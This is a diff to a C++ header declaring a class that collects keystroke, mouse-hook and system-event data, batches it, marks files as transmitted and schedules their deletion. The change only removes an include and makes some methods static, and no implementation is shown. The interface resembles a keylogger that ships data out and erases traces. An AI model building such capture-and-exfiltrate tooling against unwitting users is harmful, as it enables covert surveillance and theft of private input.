@@ -4,7 +4,6 @@
 
 #include "data/KeyData.h"
 #include "utils/SystemUtils.h"
-#include "data/SystemData.h"
 #include "core/Platform.h"
 #include <string>
 #include <vector>
@@ -85,7 +84,7 @@ public:
     bool IsBatchReady() const;
     std::vector<uint8_t> GetBatchData();
 
-    void AddMouseData(const MouseHookData & mouse_data);
+    static void AddMouseData(const MouseHookData & mouse_data);
 
 private:
     Configuration* m_config;
@@ -116,14 +115,17 @@ private:
     std::vector<std::string> GetDataFilesReadyForTransmission();
 
     std::vector<std::string> GetDataFilesReadyForTransmission() const;
-    void MarkFileAsTransmitted(const std::string& filePath);
-    void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
+
+    static void MarkFileAsTransmitted(const std::string& filePath);
+    static void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
     
     static std::string KeyDataToString(const KeyData& data);
     static std::string MouseDataToString(const MouseData& data);
     static std::string SystemInfoToString(const utils::SystemInfo& info);
-    std::string SystemEventToString(const SystemEventData& event) const;
-    std::string GenerateBatchId() const;
+
+    static std::string SystemEventToString(const SystemEventData& event);
+
+    static std::string GenerateBatchId();
 };
 
 #endif
